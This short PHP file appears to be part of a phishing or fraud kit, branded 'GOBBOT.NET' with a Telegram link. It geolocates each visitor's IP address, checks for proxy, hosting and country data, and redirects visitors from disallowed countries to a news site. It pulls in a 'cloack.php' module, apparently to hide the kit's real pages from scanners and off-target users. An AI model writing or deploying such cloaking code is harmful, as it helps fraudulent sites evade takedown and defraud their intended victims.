<?php
/**
###############################################
#    𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️ https://t.me/fatgov      #
###############################################
**/
include 'fatgov.php';
require_once 'cloack.php';

$ip = getIP();
$geolocation_data = geolocationIp($ip);
$proxy = $geolocation_data["proxy"] ?? null;
$hosting = $geolocation_data["hosting"] ?? null; 
$country_code = $geolocation_data["countryCode"] ?? null;
$isp = $geolocation_data["isp"] ?? null;
$bye = true;
if ($comprobate_country == true) {
    if (!comprobateCountry($countries_allowed, $country_code)) {
        $bye = false;
        header('location: https://clarin.com/');
    }
}





?>